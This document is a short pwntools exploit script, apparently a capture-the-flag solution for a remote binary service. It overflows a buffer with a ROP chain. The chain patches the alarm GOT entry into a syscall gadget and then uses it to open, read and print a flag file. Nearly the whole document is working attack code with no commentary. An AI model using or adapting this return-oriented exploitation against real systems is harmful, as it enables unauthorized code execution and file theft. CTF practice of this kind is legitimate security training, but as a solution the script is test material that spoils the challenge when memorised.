from pwn import*
context.log_level = 'debug'
p = process('./main')
p = remote('111.198.29.45',37457)
elf = ELF('./main')
pop_rdi_ret = 0x4008A3
pop_rax_ret = 0x4006FC
pop_rdx_ret = 0x4006FE
pop_rsi_r15 = 0x4008A1
add_al_rdi = 0x40070D
FLAG = 0x601058
payload  = '\x00'*0x38
payload += p64(pop_rax_ret) + p64(5) + p64(pop_rdi_ret) + p64(elf.got['alarm']) + p64(add_al_rdi)
payload += p64(pop_rax_ret) + p64(2) + p64(pop_rdi_ret) + p64(FLAG) + p64(pop_rdx_ret) + p64(0) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(elf.plt['alarm'])
payload += p64(pop_rax_ret) + p64(0) + p64(pop_rdi_ret) + p64(3) + p64(pop_rdx_ret) + p64(0x2D) + p64(pop_rsi_r15) + p64(elf.bss()+0x100) + p64(0) + p64(elf.plt['alarm'])
payload += p64(pop_rax_ret) + p64(1) + p64(pop_rdi_ret) + p64(1) + p64(pop_rdx_ret) + p64(0x2D) + p64(pop_rsi_r15) + p64(elf.bss()+0x100) + p64(0) + p64(elf.plt['alarm'])

p.sendlineafter('server!\n',str(336))
p.send(payload)
p.shutdown('write')
p.interactive()
